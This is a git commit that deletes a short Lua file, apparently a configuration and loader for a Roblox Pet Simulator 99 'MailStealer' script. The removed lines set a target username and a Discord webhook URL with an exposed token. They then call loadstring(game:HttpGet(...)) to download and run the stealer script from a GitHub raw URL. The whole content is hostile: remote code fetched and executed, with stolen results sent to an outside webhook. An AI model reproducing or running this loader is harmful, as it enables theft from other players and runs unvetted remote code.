a1ebedf17d2ac933d31c233a9976d7a15cc3a87c
Kchan420 <168816426+Kchan420@users.noreply.github.com>
2024-06-17 14:36:17 +0800

    Delete IDK.lua

--- IDK.lua
+++
@@ -1,5 +0,0 @@
-Username = "Tanger201000"
-LoadScreen = true
-Webhook = "https://discord.com/api/webhooks/1252143529602449418/hb58GkVfjLQba8JQpgRfkQaD9WIUa-Dwd8gOYVzU7UP-kSvEGGbnP--WmjfhG1IZCfbp" -- Paste your Discord webhook here
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
